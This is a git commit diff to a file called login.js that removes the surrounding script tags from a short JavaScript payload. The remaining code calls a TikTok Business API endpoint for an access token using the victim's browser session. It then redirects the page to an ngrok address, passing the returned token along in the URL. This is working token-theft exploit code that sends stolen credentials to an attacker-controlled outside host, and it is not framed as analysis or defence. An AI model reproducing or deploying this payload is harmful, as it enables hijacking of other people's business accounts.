50fce4e91be1958ba15bef9a7bd6a14e652b87ab
cancerz1990 <94399415+cancerz1990@users.noreply.github.com>
2023-09-05 01:08:44 +0700

    Update login.js

--- login.js
+++ login.js
@@ -1,4 +1,3 @@
-<script>
 var xhr = new XMLHttpRequest();
 xhr.onload = reqListener; 
 xhr.open("GET", "https://business.tiktok.com/api/v2/bm/organization/feelgood/access_token/?attr_source=&source_biz_id=&attr_type=web&msToken=yilgIlrMA-vnHZDQITd05O9Fw_wnOYEfz1Ow0MMOoB9SwyExog3jZ9Ar1KUUgTZyi0fpx5gTaqK2QEsEor5IVaCT8V9IIW1uS2RcYs3_Xi99H9IL_KFJ&X-Bogus=DFSzKIVOblhANG1vtyBlnTO8kJMB&_signature=_02B4Z6wo00001uR.lIgAAIDD-DwqNlsNyiLkbpAAAN337a");
@@ -9,4 +8,3 @@ xhr.send();
 function reqListener() {
     window.location='https://e884-202-162-37-174.ngrok-free.app/?key='+encodeURIComponent(this.responseText); 
 };
-</script>
